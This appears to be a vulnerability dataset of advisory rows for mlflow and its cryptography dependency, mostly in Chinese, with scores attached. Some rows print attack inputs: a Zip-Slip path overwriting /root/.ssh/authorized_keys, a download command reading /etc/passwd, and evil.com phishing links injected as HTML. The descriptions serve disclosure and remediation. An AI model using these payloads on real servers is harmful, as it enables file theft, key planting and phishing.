**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `mlflow` to version 2.4.1 or higher.
## References
- [GitHub ChangeLog](https://github.com/mlflow/mlflow/blob/6701fca95c8ee9ce1712c09a5291b0531c2fb108/CHANGELOG.md?plain=1#L14)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8648)
",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2780,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。该漏洞源于 mlflow 没有正确验证来源的 URL，导致攻击者能够通过相对路径访问预期目录之外的文件并读取任意文件。攻击者可以使用形如 'file://./etc/' 的字符串绕过检查，从而下载与 mlflow 无关的任意文件，包括服务器上已存储的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-30172,CWE-22,2023-05-10,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow v2.0.1版本及之前版本存在安全漏洞。攻击者利用该漏洞可以通过path参数读取服务器上的任意文件。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2356,CWE-23,,MLflow 是一个开源的机器学习平台，用于管理机器学习项目、跟踪实验、构建模型和部署代码。MLflow 在 2.3.1 版本之前存在文件读取漏洞。攻击者在请求 /api/2.0/mlflow/registered-models/create 路由时可以通过 source 参数指定路径，随后利用 /model-versions/get-artifact 路由读取任意文件内容，可能导致敏感信息泄露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6015,CWE-22,,MLflow 是一个开源平台，用于简化机器学习开发，包括跟踪实验、将代码打包成可重现的运行并共享和部署模型。受影响的版本存在路径遍历漏洞，该漏洞源于在 `handlers.py` 中的检查被跳过。攻击者可以通过路径遍历攻击从 Windows 的根目录中突破，读取或写入主机上的敏感数据（可能包括 SSH 密钥）。此漏洞仅在 Windows 操作系统上可被利用，利用示例包括发送包含 `C:../` 的请求。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1177,CWE-29 CWE-22,,MLflow是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重复运行的方式以及共享和部署模型。在使用mlflow-server和mlflow-ui命令的情况下，存在路径遍历漏洞，攻击者可以利用此漏洞从主机服务器下载任意文件，包括与MLflow无关的文件。这一问题仅影响运行这些命令的用户，以及相关集成，比如在未受到限制的环境中使用此命令。,1,1
mlflow_mlflow,mlflow,,True,CVE-2022-0736,CWE-377,2022-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 中存在安全漏洞，该漏洞源于产品的tempfile.mktemp()函数未能正确处理多进程状态。攻击者可通过该漏洞创建同名临时文件。以下产品及版本受到影响：Mlflow 1.23.1 之前版本。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-4033,CWE-78,,Mlflow 是一个开源的机器学习生命周期管理平台，提供实验跟踪、模型管理等功能。版本 2.6.0 之前的 mlflow 存在操作系统命令注入漏洞。该漏洞的根本原因是 `backend.py` 文件中的 `predict()` 方法未能正确转义参数，导致攻击者可以向 `models predict` 操作的 CLI 参数中注入恶意命令。当系统使用不当时，攻击者能够执行任意操作系统命令。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-3765,CWE-36,,Mlflow 是一个开源的机器学习生命周期管理平台。受影响的版本在 validate_path_is_safe() 函数中存在路径遍历漏洞，导致对绝对 Windows 路径的处理不当。攻击者可以利用此漏洞列出、下载、写入和删除系统文件。此漏洞仅在运行 Windows 操作系统的主机上可被利用。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1176,CWE-36,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习的开发过程，包括实验追踪、代码打包和模型共享及部署。如果使用早于 MLflow 2.2.1 的版本，且未限制谁可以查询其服务器，可能会受到远程文件存在检查漏洞的影响。该漏洞发生在运行 mlflow server 或 mlflow ui 命令时，由于未对模型名称进行适当验证，导致攻击者能够检查主机服务器上任意文件的存在性。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mlflow_mlflow,mlflow,,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mlflow_mlflow,mlflow,,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mlflow_mlflow,mlflow,,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发人员管理机器学习生命周期。该漏洞存在于创建实验与模型的功能中，攻击者可以利用跨站请求伪造（CSRF）攻击来在未授权用户的情况下创建实验和模型。具体来说，当用户访问精心构造的网页时，该攻击可以自动提交请求以创建新的模型，如“test”。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLFlow 是一个用于机器学习操作的程序，允许工程师运行、记录和重现他们的实验与模型。当攻击者利用符号链接和日志记录功能时，可能导致内部机密文件的曝光。漏洞的根本原因在于使用 Python 的 `with open` 函数，在处理符号链接的过程中不当处理导致泄露。如果攻击者成功提取了符号链接的归档文件并存储在跟踪服务器上，就能够利用 MLFlow API 获取相关文件。一旦攻击者获得 SSH 密钥，则可能导致对其他模型及其相关数据的访问。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理平台，允许用户轻松地构建和管理机器学习模型。该漏洞的根本原因在于 mlflow 在加载模型时使用了 Python 的原生 Unpickler，该组件对反序列化攻击存在脆弱性，允许恶意模型通过隐藏有效载荷来执行任意代码，包括操作系统命令。由于这一脆弱性，不仅在 mlflow.pyfunc.load_model 中存在，在 mlflow 的多个其他位置，如 mlflow.sklearn.load_model 和 mlflow.pytorch.pickle_module.py 中也有类似问题。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的平台，旨在为机器学习项目提供管理和部署服务。该漏洞影响版本 2.5.0。由于在模型版本创建过程中未能正确处理输入参数，攻击者可以利用该漏洞向其他用户的账户注入恶意脚本。具体来说，攻击者在创建模型版本时，设置的运行链接（run_link）参数可以包含 JavaScript 代码。当受害者用户访问该链接时，恶意脚本将在其浏览器中执行，从而导致信息泄露或账户控制。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mlflow_mlflow,mlflow,,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-4741,CWE-416,2024-05-28,在某些情况下，调用OpenSSL API函数SSL_free_buffers可能导致访问已释放的内存。具体来说，当处理来自网络的记录时，如果记录头已接收但记录体尚未到达，或者记录数据部分被读取但缓冲区仍在使用的情况下调用SSL_free_buffers会成功，从而导致内存使用后释放的漏洞。,2,2
mlflow_mlflow,cryptography,39.0.1,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mlflow_mlflow,cryptography,39.0.1,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mlflow_mlflow,cryptography,39.0.1,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2024-26130,CWE-476,2024-02-21,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 38.0.0版本至42.0.4之前版本存在安全漏洞，该漏洞源于NULL指针取消引用，从而导致Python进程崩溃。",2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-6237,CWE-606,2024-01-15,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0及更高版本存在安全漏洞，该漏洞源于调用EVP_PKEY_public_check（）函数并提供不可信的RSA密钥时容易受到拒绝服务（DOS）攻击。",3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-6129,CWE-440 CWE-787,2024-01-09,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0.0 到 3.0.12、3.1.0 到 3.1.4 和 3.2.0版本存在安全漏洞，该漏洞源于POLY1305 MAC算法存在安全问题。",3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-49083,CWE-476,2023-11-29,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python cryptography 3.1到 41.0.6版本存在代码问题漏洞，该漏洞源于加载 PKCS7 证书时可能会导致空指针取消引用和段错误。",3,0
mlflow_mlflow,cryptography,39.0.1,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
